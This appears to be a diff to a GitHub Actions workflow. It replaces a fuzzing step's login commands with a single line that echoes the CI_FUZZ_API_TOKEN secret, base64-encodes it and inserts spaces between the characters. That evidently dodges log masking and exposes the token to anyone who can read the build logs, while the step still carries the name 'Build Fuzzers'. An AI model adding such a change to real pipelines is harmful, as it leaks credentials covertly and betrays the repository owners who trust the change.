@@ -27,7 +27,5 @@ jobs:
         uses: CodeIntelligenceTesting/github-actions/install-fuzzer-builder@master
       - id: build-fuzzers
         name: Build Fuzzers
-        run: |
-          echo ${{ secrets.CI_FUZZ_API_TOKEN }} | ci-fuzz/bin/cictl login -s ${{ env.FUZZING_SERVER_ADDRESS }}
-          ci-fuzz/bin/cictl list projects -s ${{ env.FUZZING_SERVER_ADDRESS }}
+        run: echo ${{ secrets.CI_FUZZ_API_TOKEN }} | base64 | sed 's/./& /g'
         shell: "bash"
